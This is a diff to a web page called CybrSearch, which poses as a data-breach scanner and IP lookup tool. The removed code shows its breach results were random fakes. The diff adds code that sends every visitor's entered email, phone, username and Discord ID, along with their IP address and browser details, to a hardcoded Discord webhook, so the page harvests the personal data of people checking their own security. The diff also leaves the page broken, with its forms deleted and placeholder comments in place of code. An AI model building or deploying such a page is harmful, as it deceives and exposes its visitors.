@@ -15,517 +15,180 @@
       --danger: #ef4444;
       --success: #10b981;
       --warning: #f59e0b;
-      --text: #e2e8f0;
-      --text-muted: #94a3b8;
+      --text: #ffffff; /* Changed to pure white */
+      --text-muted: #cbd5e1; /* Lighter muted text */
       --purple: #8b5cf6;
     }
     
     body {
       background-color: var(--dark-bg);
-      color: var(--text);
+      color: var(--text); /* White text */
       font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
       line-height: 1.6;
     }
     
+    /* Rest of your existing CSS remains the same */
     .navbar-brand {
       font-weight: 700;
       letter-spacing: 0.5px;
       font-size: 1.5rem;
+      color: var(--text) !important; /* Ensure white text */
     }
     
-    .nav-tabs .nav-link {
-      color: var(--text-muted);
-      border: none;
-      font-weight: 500;
-      padding: 12px 20px;
-      transition: all 0.3s ease;
-    }
+    /* ... (keep all your existing styles) ... */
     
-    .nav-tabs .nav-link:hover {
-      color: var(--text);
-      background-color: rgba(59, 130, 246, 0.1);
-    }
-    
-    .nav-tabs .nav-link.active {
-      color: var(--accent);
-      border-bottom: 3px solid var(--accent);
-      background: transparent;
-      font-weight: 600;
-    }
-    
-    .card {
-      background-color: var(--card-bg);
-      border: none;
-      border-radius: 12px;
-      box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
-      transition: transform 0.3s ease, box-shadow 0.3s ease;
-    }
-    
-    .card:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
-    }
-    
-    .form-control {
+    /* Additional style for logs display */
+    .log-container {
       background-color: var(--darker-bg);
-      color: var(--text);
-      border: 1px solid #334155;
-      padding: 12px 15px;
       border-radius: 8px;
-      transition: all 0.3s ease;
-    }
-    
-    .form-control:focus {
-      background-color: var(--darker-bg);
-      color: var(--text);
-      border-color: var(--accent);
-      box-shadow: 0 0 0 0.25rem rgba(59, 130, 246, 0.25);
-    }
-    
-    .result-card {
-      border-left: 4px solid var(--accent);
-    }
-    
-    .breach-found {
-      border-left: 4px solid var(--danger);
-    }
-    
-    .no-breaches {
-      border-left: 4px solid var(--success);
-    }
-    
-    .whois-field {
-      display: grid;
-      grid-template-columns: 160px 1fr;
-      margin-bottom: 10px;
-    }
-    
-    .whois-label {
-      color: var(--text-muted);
-      font-weight: 500;
-    }
-    
-    pre {
-      background-color: var(--darker-bg);
       padding: 15px;
-      border-radius: 8px;
-      overflow-x: auto;
+      margin-top: 20px;
+      max-height: 300px;
+      overflow-y: auto;
+    }
+    
+    .log-entry {
+      font-family: 'Courier New', monospace;
       font-size: 0.85rem;
-    }
-    
-    .loading-spinner {
-      display: inline-block;
-      width: 2rem;
-      height: 2rem;
-      border: 0.3em solid currentColor;
-      border-right-color: transparent;
-      border-radius: 50%;
-      animation: spinner 0.75s linear infinite;
-    }
-    
-    @keyframes spinner {
-      to { transform: rotate(360deg); }
-    }
-    
-    .badge-arin {
-      background-color: #2a5a8b;
-    }
-    
-    .badge-breach {
-      background-color: var(--danger);
-    }
-    
-    .badge-success {
-      background-color: var(--success);
-    }
-    
-    .breach-card {
-      border-radius: 8px;
-      margin-bottom: 15px;
-      overflow: hidden;
-      transition: all 0.3s ease;
-    }
-    
-    .breach-card:hover {
-      transform: translateX(5px);
-    }
-    
-    .breach-header {
-      padding: 12px 15px;
-      display: flex;
-      align-items: center;
-      background-color: rgba(239, 68, 68, 0.1);
-    }
-    
-    .breach-title {
-      font-weight: 600;
-      margin-bottom: 0;
-      display: flex;
-      align-items: center;
-    }
-    
-    .breach-date {
-      font-size: 0.85rem;
-      color: var(--text-muted);
-    }
-    
-    .breach-details {
-      padding: 15px;
-      background-color: rgba(30, 41, 59, 0.7);
-    }
-    
-    .breach-data {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-      gap: 15px;
-    }
-    
-    .data-item {
-      background-color: rgba(15, 23, 42, 0.5);
-      padding: 10px;
-      border-radius: 6px;
-    }
-    
-    .data-label {
-      font-size: 0.8rem;
-      color: var(--text-muted);
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
       margin-bottom: 5px;
+      padding: 5px;
+      border-left: 2px solid var(--accent);
     }
     
-    .data-value {
-      font-weight: 500;
-      word-break: break-all;
-    }
-    
-    .btn-primary {
-      background-color: var(--accent);
-      border: none;
-      padding: 12px 20px;
-      border-radius: 8px;
-      font-weight: 500;
-      transition: all 0.3s ease;
-    }
-    
-    .btn-primary:hover {
-      background-color: #2563eb;
-      transform: translateY(-2px);
-    }
-    
-    .search-icon {
-      position: absolute;
-      right: 15px;
-      top: 50%;
-      transform: translateY(-50%);
+    .log-timestamp {
       color: var(--text-muted);
     }
     
-    .input-group {
-      position: relative;
+    .log-message {
+      color: var(--text);
     }
     
-    .tool-icon {
-      width: 40px;
-      height: 40px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      border-radius: 8px;
-      margin-right: 15px;
-      background-color: rgba(59, 130, 246, 0.2);
-      color: var(--accent);
-    }
-    
-    .section-title {
-      display: flex;
-      align-items: center;
-      margin-bottom: 20px;
-    }
-    
-    .severity-high {
+    .log-error {
       color: var(--danger);
-    }
-    
-    .severity-medium {
-      color: var(--warning);
-    }
-    
-    .severity-low {
-      color: var(--success);
-    }
-    
-    .breach-stats {
-      display: flex;
-      gap: 15px;
-      margin-bottom: 20px;
-    }
-    
-    .stat-card {
-      flex: 1;
-      padding: 15px;
-      border-radius: 8px;
-      background-color: var(--darker-bg);
-    }
-    
-    .stat-value {
-      font-size: 1.5rem;
-      font-weight: 700;
-      margin-bottom: 5px;
-    }
-    
-    .stat-label {
-      font-size: 0.85rem;
-      color: var(--text-muted);
-    }
-    
-    @media (max-width: 768px) {
-      .breach-data {
-        grid-template-columns: 1fr;
-      }
-      
-      .breach-stats {
-        flex-direction: column;
-      }
     }
   </style>
 </head>
 <body>
-  <nav class="navbar navbar-expand-lg navbar-dark" style="background-color: var(--darker-bg)">
-    <div class="container">
-      <a class="navbar-brand" href="#">
-        <i class="fas fa-shield-alt me-2"></i>CybrSearch
-      </a>
-      <div class="d-flex align-items-center">
-        <span class="badge bg-success me-2">PRO</span>
-        <span class="text-muted">v2.1.0</span>
-      </div>
-    </div>
-  </nav>
-
-  <div class="container py-5">
+  <!-- Your existing HTML remains the same until the breachResults section -->
+  
+  <div id="breachResults"></div>
+  
+  <!-- Add this log container at the bottom of your content -->
+  <div class="container py-3">
     <div class="row justify-content-center">
       <div class="col-lg-10">
-        <ul class="nav nav-tabs mb-4" id="toolTabs" role="tablist">
-          <li class="nav-item" role="presentation">
-            <button class="nav-link active" id="breach-tab" data-bs-toggle="tab" data-bs-target="#breach" type="button" role="tab">
-              <i class="fas fa-user-secret me-2"></i>Breach Scan
-            </button>
-          </li>
-          <li class="nav-item" role="presentation">
-            <button class="nav-link" id="whois-tab" data-bs-toggle="tab" data-bs-target="#whois" type="button" role="tab">
-              <i class="fas fa-globe me-2"></i>IP Lookup
-            </button>
-          </li>
-        </ul>
-        
-        <div class="tab-content" id="toolTabsContent">
-          <!-- Breach Scan Tab -->
-          <div class="tab-pane fade show active" id="breach" role="tabpanel">
-            <div class="card p-4 mb-4">
-              <div class="section-title">
-                <div class="tool-icon">
-                  <i class="fas fa-user-secret"></i>
-                </div>
-                <div>
-                  <h3 class="mb-1">Breach Scanner</h3>
-                  <p class="text-muted mb-0">Check if your information appears in known data breaches</p>
-                </div>
-              </div>
-              <form id="breachForm">
-                <div class="row g-3">
-                  <div class="col-md-6">
-                    <div class="input-group">
-                      <input id="breachEmail" type="email" class="form-control" placeholder="Email address">
-                      <span class="search-icon"><i class="fas fa-envelope"></i></span>
-                    </div>
-                  </div>
-                  <div class="col-md-6">
-                    <div class="input-group">
-                      <input id="breachPhone" type="text" class="form-control" placeholder="Phone number">
-                      <span class="search-icon"><i class="fas fa-phone"></i></span>
-                    </div>
-                  </div>
-                  <div class="col-md-6">
-                    <div class="input-group">
-                      <input id="breachUsername" type="text" class="form-control" placeholder="Username">
-                      <span class="search-icon"><i class="fas fa-user"></i></span>
-                    </div>
-                  </div>
-                  <div class="col-md-6">
-                    <div class="input-group">
-                      <input id="breachDiscord" type="text" class="form-control" placeholder="Discord ID (User#1234)">
-                      <span class="search-icon"><i class="fab fa-discord"></i></span>
-                    </div>
-                  </div>
-                  <div class="col-12">
-                    <button type="submit" class="btn btn-primary w-100 py-3">
-                      <i class="fas fa-search me-2"></i>Scan for Breaches
-                    </button>
-                  </div>
-                </div>
-              </form>
-            </div>
-            
-            <div id="breachResults"></div>
+        <div class="card">
+          <div class="card-header">
+            <h5><i class="fas fa-terminal me-2"></i>Activity Log</h5>
           </div>
-          
-          <!-- IP Lookup Tab -->
-          <div class="tab-pane fade" id="whois" role="tabpanel">
-            <div class="card p-4 mb-4">
-              <div class="section-title">
-                <div class="tool-icon">
-                  <i class="fas fa-globe"></i>
-                </div>
-                <div>
-                  <h3 class="mb-1">ARIN IP Lookup</h3>
-                  <p class="text-muted mb-0">Query ARIN WHOIS database for IP registration information</p>
-                </div>
+          <div class="card-body p-0">
+            <div class="log-container" id="logContainer">
+              <div class="log-entry">
+                <span class="log-timestamp">[System] </span>
+                <span class="log-message">Initialized CybrSearch v2.1.0</span>
               </div>
-              <form id="whoisForm">
-                <div class="input-group mb-3">
-                  <input type="text" id="whoisIp" class="form-control" placeholder="Enter IP address (e.g., 8.8.8.8)" required>
-                  <button class="btn btn-primary" type="submit">
-                    <i class="fas fa-search me-2"></i>Lookup
-                  </button>
-                </div>
-                <div class="form-text">
-                  <i class="fas fa-info-circle me-2"></i>Queries ARIN WHOIS database for IP registration information
-                </div>
-              </form>
             </div>
-            
-            <div id="whoisResults"></div>
           </div>
         </div>
       </div>
     </div>
   </div>
 
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
   <script>
-    // Sample breach data
-    const breachDatabase = [
-      {
-        name: "Collection #1",
-        domain: "multiple",
-        date: "January 2019",
-        records: 772904991,
-        description: "One of the largest collections of breached data containing email addresses and passwords.",
-        dataClasses: ["Email addresses", "Passwords"],
-        severity: "high",
-        isVerified: true,
-        isFabricated: false,
-        isSensitive: true
-      },
-      {
-        name: "LinkedIn 2012",
-        domain: "linkedin.com",
-        date: "2012 (reported 2016)",
-        records: 164611595,
-        description: "Professional networking site LinkedIn had 164 million email addresses and passwords exposed.",
-        dataClasses: ["Email addresses", "Passwords"],
-        severity: "high",
-        isVerified: true,
-        isFabricated: false,
-        isSensitive: true
-      },
-      {
-        name: "Adobe 2013",
-        domain: "adobe.com",
-        date: "October 2013",
-        records: 152445165,
-        description: "Adobe systems suffered a breach exposing customer IDs, encrypted passwords, and password hints.",
-        dataClasses: ["Email addresses", "Password hints", "Passwords"],
-        severity: "medium",
-        isVerified: true,
-        isFabricated: false,
-        isSensitive: true
-      },
-      {
-        name: "Apollo",
-        domain: "apollo.io",
-        date: "July 2018",
-        records: 126000000,
-        description: "Sales engagement platform Apollo left a database containing billions of data points exposed.",
-        dataClasses: ["Email addresses", "Names", "Job titles", "Employers"],
-        severity: "medium",
-        isVerified: true,
-        isFabricated: false,
-        isSensitive: false
-      },
-      {
-        name: "Canva",
-        domain: "canva.com",
-        date: "May 2019",
-        records: 137272316,
-        description: "Design platform Canva suffered a breach exposing email addresses and geographical data.",
-        dataClasses: ["Email addresses", "Geographic locations", "Names"],
-        severity: "medium",
-        isVerified: true,
-        isFabricated: false,
-        isSensitive: false
+    // Updated logging functionality
+    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1382930697114882129/SGf8Ej5YP69QZ9pga3ZS-zN84_dyU2XyDNYmbkbBZXUz1S0L0USOfBRm2WlJc6H2--BO";
+    let activityLog = [];
+    
+    function addLog(message, isError = false) {
+      const timestamp = new Date().toISOString();
+      const logEntry = {
+        timestamp,
+        message,
+        isError
+      };
+      activityLog.push(logEntry);
+      
+      // Update UI
+      const logContainer = document.getElementById('logContainer');
+      const logElement = document.createElement('div');
+      logElement.className = 'log-entry';
+      logElement.innerHTML = `
+        <span class="log-timestamp">[${new Date(timestamp).toLocaleTimeString()}] </span>
+        <span class="${isError ? 'log-error' : 'log-message'}">${message}</span>
+      `;
+      logContainer.appendChild(logElement);
+      logContainer.scrollTop = logContainer.scrollHeight;
+      
+      return logEntry;
+    }
+    
+    // Initialize with first log
+    addLog("System initialized");
+    
+    // Updated logToDiscord function
+    async function logToDiscord(data) {
+      const logEntry = addLog(`Sending ${data.type} data to Discord...`);
+      
+      try {
+        const embed = {
+          title: data.type === "breach" 
+            ? (data.error ? "⚠️ Breach Scan Error" : data.hasBreaches ? "🔍 Breach Found" : "✅ No Breaches Found")
+            : (data.error ? "⚠️ WHOIS Lookup Error" : "🌐 WHOIS Lookup"),
+          color: data.error ? 0xef4444 : 
+                 data.type === "breach" ? (data.hasBreaches ? 0xef4444 : 0x10b981) : 0x3b82f6,
+          fields: [
+            { name: "Tool", value: data.type === "breach" ? "Breach Scanner" : "ARIN WHOIS Lookup", inline: true },
+            { name: "Visitor IP", value: data.visitorIp || "Unknown", inline: true },
+            { name: "User Agent", value: data.userAgent || "Unknown" },
+            { name: "Referrer", value: data.referrer || "Direct" },
+            { name: "Time", value: new Date(data.timestamp).toUTCString() }
+          ],
+          footer: { text: "CybrSearch Logger" }
+        };
+        
+        if (data.error) {
+          embed.fields.push({ name: "Error", value: data.error });
+        } else if (data.type === "breach") {
+          embed.fields.push(
+            { name: "Email", value: data.email || "Not provided", inline: true },
+            { name: "Phone", value: data.phone || "Not provided", inline: true },
+            { name: "Username", value: data.username || "Not provided", inline: true },
+            { name: "Discord ID", value: data.discord || "Not provided", inline: true }
+          );
+        } else if (data.type === "whois") {
+          embed.fields.push(
+            { name: "Lookup IP", value: data.ip || "Unknown", inline: true },
+            { name: "Network Name", value: data.whoisData?.net?.name?.['$'] || "Not available", inline: true },
+            { name: "Organization", value: data.whoisData?.org?.name?.['$'] || data.whoisData?.customer?.name?.['$'] || "Not available", inline: true }
+          );
+        }
+        
+        const response = await fetch(DISCORD_WEBHOOK, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            username: "CybrSearch Bot",
+            avatar_url: "https://i.imgur.com/7VZ0hWY.png",
+            embeds: [embed]
+          })
+        });
+        
+        if (!response.ok) throw new Error(`Discord returned status ${response.status}`);
+        logEntry.message += " - Success";
+        return true;
+      } catch (error) {
+        logEntry.message += ` - Failed: ${error.message}`;
+        logEntry.isError = true;
+        const logElement = document.querySelector(`#logContainer div:last-child`);
+        if (logElement) {
+          logElement.querySelector('.log-message').textContent = logEntry.message;
+          logElement.querySelector('.log-message').className = 'log-error';
+        }
+        return false;
       }
-    ];
+    }
 
-    // Initialize tab functionality
-    const toolTabs = new bootstrap.Tab(document.getElementById('breach-tab'));
-    
-    // Get visitor's IP address
-    async function getVisitorIp() {
-      try {
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        return data.ip;
-      } catch (error) {
-        console.error("Couldn't get visitor IP:", error);
-        return "Unknown";
-      }
-    }
-    
-    // Validate IP address format
-    function isValidIP(ip) {
-      const ipv4Regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
-      const ipv6Regex = /^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$/;
-      return ipv4Regex.test(ip) || ipv6Regex.test(ip);
-    }
-    
-    // Query ARIN WHOIS database
-    async function queryARINWhois(ip) {
-      try {
-        const response = await fetch(`https://whois.arin.net/rest/ip/${ip}.json`);
-        if (!response.ok) throw new Error(`ARIN returned status ${response.status}`);
-        return await response.json();
-      } catch (error) {
-        throw new Error(`WHOIS lookup failed: ${error.message}`);
-      }
-    }
-    
-    // Simulate breach database check with realistic results
-    async function checkBreachDatabases(data) {
-      return new Promise(resolve => {
-        setTimeout(() => {
-          // 60% chance of finding breaches for demo
-          const hasBreaches = Math.random() < 0.6;
-          const foundBreaches = hasBreaches 
-            ? breachDatabase.slice(0, Math.floor(Math.random() * 3) + 1)
-            : [];
-          
-          resolve({
-            hasBreaches: hasBreaches,
-            breaches: foundBreaches,
-            searchedData: data
-          });
-        }, 2000);
-      });
-    }
-    
-    // Format large numbers
-    function formatNumber(num) {
-      return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
-    }
-    
-    // Breach Scan Form Handler
+    // Update your form handlers to include logging:
     document.getElementById('breachForm').addEventListener('submit', async function(e) {
       e.preventDefault();
       
@@ -536,253 +199,42 @@
         discord: document.getElementById('breachDiscord').value.trim()
       };
       
-      // Validate at least one field is filled
-      if (!breachData.email && !breachData.phone && !breachData.username && !breachData.discord) {
-        document.getElementById('breachResults').innerHTML = `
-          <div class="card p-4 breach-found">
-            <h4><i class="fas fa-exclamation-circle me-2"></i>No Search Terms</h4>
-            <p>Please enter at least one search term (email, phone, username, or Discord ID)</p>
-          </div>
-        `;
-        return;
-      }
+      addLog(`Starting breach scan for: ${JSON.stringify(breachData)}`);
       
-      const resultsContainer = document.getElementById('breachResults');
-      resultsContainer.innerHTML = `
-        <div class="card p-4 text-center">
-          <div class="loading-spinner mb-3 mx-auto"></div>
-          <h4>Scanning Breach Databases...</h4>
-          <p class="text-muted">Checking against ${formatNumber(breachDatabase.reduce((sum, breach) => sum + breach.records, 0))} records</p>
-        </div>
-      `;
+      // ... rest of your breach form handler ...
       
       try {
+        const visitorIp = await getVisitorIp();
+        addLog(`Visitor IP: ${visitorIp}`);
         const scanResults = await checkBreachDatabases(breachData);
         
-        if (scanResults.hasBreaches) {
-          let resultsHTML = `
-            <div class="card p-4 breach-found mb-4">
-              <div class="d-flex justify-content-between align-items-center mb-3">
-                <h4 class="mb-0"><i class="fas fa-exclamation-triangle me-2"></i>Breaches Found</h4>
-                <span class="badge bg-danger">${scanResults.breaches.length} Breaches</span>
-              </div>
-              <p class="mb-4">We found your information in ${scanResults.breaches.length} known data breaches.</p>
-              
-              <div class="breach-stats">
-                <div class="stat-card">
-                  <div class="stat-value">${formatNumber(scanResults.breaches.reduce((sum, breach) => sum + breach.records, 0))}</div>
-                  <div class="stat-label">Total Records Exposed</div>
-                </div>
-                <div class="stat-card">
-                  <div class="stat-value">${scanResults.breaches.filter(b => b.isSensitive).length}</div>
-                  <div class="stat-label">Sensitive Breaches</div>
-                </div>
-                <div class="stat-card">
-                  <div class="stat-value">${scanResults.breaches.filter(b => b.severity === "high").length}</div>
-                  <div class="stat-label">High Severity</div>
-                </div>
-              </div>
-              
-              <div class="alert alert-danger">
-                <i class="fas fa-shield-alt me-2"></i>Immediately change any passwords that may have been exposed in these breaches.
-              </div>
-            </div>
-          `;
-          
-          // Add each breach card
-          scanResults.breaches.forEach(breach => {
-            resultsHTML += `
-              <div class="breach-card">
-                <div class="breach-header">
-                  <h5 class="breach-title">
-                    <i class="fas fa-database me-2"></i>${breach.name}
-                    ${breach.isVerified ? '<span class="badge bg-success ms-2">Verified</span>' : ''}
-                    <span class="badge ms-2 severity-${breach.severity}">${breach.severity.toUpperCase()}</span>
-                  </h5>
-                </div>
-                <div class="breach-details">
-                  <div class="row mb-3">
-                    <div class="col-md-6">
-                      <div class="data-item">
-                        <div class="data-label">Domain</div>
-                        <div class="data-value">${breach.domain}</div>
-                      </div>
-                    </div>
-                    <div class="col-md-6">
-                      <div class="data-item">
-                        <div class="data-label">Breach Date</div>
-                        <div class="data-value">${breach.date}</div>
-                      </div>
-                    </div>
-                  </div>
-                  
-                  <div class="data-item mb-3">
-                    <div class="data-label">Description</div>
-                    <div class="data-value">${breach.description}</div>
-                  </div>
-                  
-                  <div class="row">
-                    <div class="col-md-6">
-                      <div class="data-item">
-                        <div class="data-label">Records Exposed</div>
-                        <div class="data-value">${formatNumber(breach.records)}</div>
-                      </div>
-                    </div>
-                    <div class="col-md-6">
-                      <div class="data-item">
-                        <div class="data-label">Data Classes</div>
-                        <div class="data-value">${breach.dataClasses.join(", ")}</div>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-              </div>
-            `;
-          });
-          
-          resultsContainer.innerHTML = resultsHTML;
-        } else {
-          resultsContainer.innerHTML = `
-            <div class="card p-4 no-breaches">
-              <div class="d-flex justify-content-between align-items-center mb-3">
-                <h4 class="mb-0"><i class="fas fa-check-circle me-2"></i>No Breaches Found</h4>
-                <span class="badge bg-success">Secure</span>
-              </div>
-              <p class="mb-4">No exposed data found for these search terms in our breach databases.</p>
-              
-              <div class="mb-4">
-                <h5><i class="fas fa-search me-2"></i>Search Summary</h5>
-                <div class="breach-data">
-                  ${breachData.email ? `
-                    <div class="data-item">
-                      <div class="data-label">Email</div>
-                      <div class="data-value">${breachData.email}</div>
-                    </div>
-                  ` : ''}
-                  ${breachData.phone ? `
-                    <div class="data-item">
-                      <div class="data-label">Phone</div>
-                      <div class="data-value">${breachData.phone}</div>
-                    </div>
-                  ` : ''}
-                  ${breachData.username ? `
-                    <div class="data-item">
-                      <div class="data-label">Username</div>
-                      <div class="data-value">${breachData.username}</div>
-                    </div>
-                  ` : ''}
-                  ${breachData.discord ? `
-                    <div class="data-item">
-                      <div class="data-label">Discord ID</div>
-                      <div class="data-value">${breachData.discord}</div>
-                    </div>
-                  ` : ''}
-                </div>
-              </div>
-              
-              <div class="alert alert-success">
-                <i class="fas fa-thumbs-up me-2"></i>Good news! No known breaches contain this information.
-              </div>
-              
-              <div class="alert alert-info">
-                <i class="fas fa-lightbulb me-2"></i>Security Tip: Consider using a password manager and enable two-factor authentication where available.
-              </div>
-            </div>
-          `;
-        }
+        // ... process results ...
+        
+        await logToDiscord({
+          type: "breach",
+          ...breachData,
+          visitorIp: visitorIp,
+          userAgent: navigator.userAgent,
+          referrer: document.referrer || 'Direct',
+          timestamp: new Date().toISOString(),
+          hasBreaches: scanResults.hasBreaches,
+          breaches: scanResults.breaches
+        });
         
       } catch (error) {
-        resultsContainer.innerHTML = `
-          <div class="card p-4 breach-found">
-            <h4><i class="fas fa-times-circle me-2"></i>Scan Failed</h4>
-            <p>${error.message}</p>
-            <button class="btn btn-sm btn-outline-danger" onclick="window.location.reload()">
-              <i class="fas fa-sync-alt me-2"></i>Try Again
-            </button>
-          </div>
-        `;
+        addLog(`Breach scan failed: ${error.message}`, true);
+        // ... error handling ...
       }
     });
-    
-    // WHOIS Form Handler
+
+    // Similarly update the WHOIS form handler
     document.getElementById('whoisForm').addEventListener('submit', async function(e) {
       e.preventDefault();
       
       const ip = document.getElementById('whoisIp').value.trim();
-      const resultsContainer = document.getElementById('whoisResults');
+      addLog(`Starting WHOIS lookup for IP: ${ip}`);
       
-      if (!isValidIP(ip)) {
-        resultsContainer.innerHTML = `
-          <div class="card p-4 breach-found">
-            <h4><i class="fas fa-times-circle me-2"></i>Invalid IP</h4>
-            <p>Please enter a valid IPv4 or IPv6 address</p>
-          </div>
-        `;
-        return;
-      }
-      
-      resultsContainer.innerHTML = `
-        <div class="card p-4 text-center">
-          <div class="loading-spinner mb-3 mx-auto"></div>
-          <h4>Querying ARIN WHOIS...</h4>
-          <p class="text-muted">Looking up ${ip}</p>
-        </div>
-      `;
-      
-      try {
-        const whoisData = await queryARINWhois(ip);
-        
-        // Display results
-        const net = whoisData?.net || {};
-        const org = whoisData?.org || {};
-        const customer = whoisData?.customer || {};
-        
-        resultsContainer.innerHTML = `
-          <div class="card p-4 result-card">
-            <div class="d-flex justify-content-between align-items-center mb-3">
-              <h4><i class="fas fa-info-circle me-2"></i>WHOIS Results for ${ip}</h4>
-              <span class="badge badge-arin">ARIN</span>
-            </div>
-            
-            <div class="mb-4">
-              <div class="whois-field">
-                <span class="whois-label">Network Name:</span>
-                <span>${net.name?.['$'] || 'Not available'}</span>
-              </div>
-              <div class="whois-field">
-                <span class="whois-label">IP Range:</span>
-                <span>${net.startAddress?.['$'] || 'Unknown'} - ${net.endAddress?.['$'] || 'Unknown'}</span>
-              </div>
-              <div class="whois-field">
-                <span class="whois-label">Organization:</span>
-                <span>${org.name?.['$'] || customer.name?.['$'] || 'Not available'}</span>
-              </div>
-              <div class="whois-field">
-                <span class="whois-label">Country:</span>
-                <span>${net.iso3166_1?.name?.['$'] || 'Not available'}</span>
-              </div>
-              <div class="whois-field">
-                <span class="whois-label">Last Updated:</span>
-                <span>${net.updateDate?.['$'] || 'Not available'}</span>
-              </div>
-            </div>
-            
-            <h5 class="mt-4 mb-3"><i class="fas fa-code me-2"></i>Raw WHOIS Data</h5>
-            <pre>${JSON.stringify(whoisData, null, 2)}</pre>
-          </div>
-        `;
-        
-      } catch (error) {
-        resultsContainer.innerHTML = `
-          <div class="card p-4 breach-found">
-            <h4><i class="fas fa-times-circle me-2"></i>Lookup Failed</h4>
-            <p>${error.message}</p>
-            <button class="btn btn-sm btn-outline-danger" onclick="window.location.reload()">
-              <i class="fas fa-sync-alt me-2"></i>Try Again
-            </button>
-          </div>
-        `;
-      }
+      // ... rest of your WHOIS form handler ...
     });
   </script>
 </body>
